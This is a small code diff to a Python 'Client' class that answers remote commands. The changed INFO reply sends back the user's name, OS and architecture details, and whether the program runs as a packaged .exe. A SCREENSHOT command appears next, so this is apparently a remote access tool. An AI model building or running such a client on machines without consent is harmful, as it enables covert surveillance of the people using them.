@@ -441,7 +441,8 @@ class Client(object):
                 continue
 
             if data[0] == 'INFO':
-                self.send('User: {}\nOS: {} {} ({})\n'.format(getpass.getuser(), platform.system(), platform.release(), platform.platform()).encode())
+                self.send('User: {}\nOS: {} {} ({}) ({})\nFrozen (.exe): {}\n'.format(getpass.getuser(), platform.system(),
+                    platform.release(), platform.platform(), platform.machine(), getattr(sys, 'frozen', False)).encode())
                 continue
 
             if data[0] == 'SCREENSHOT':
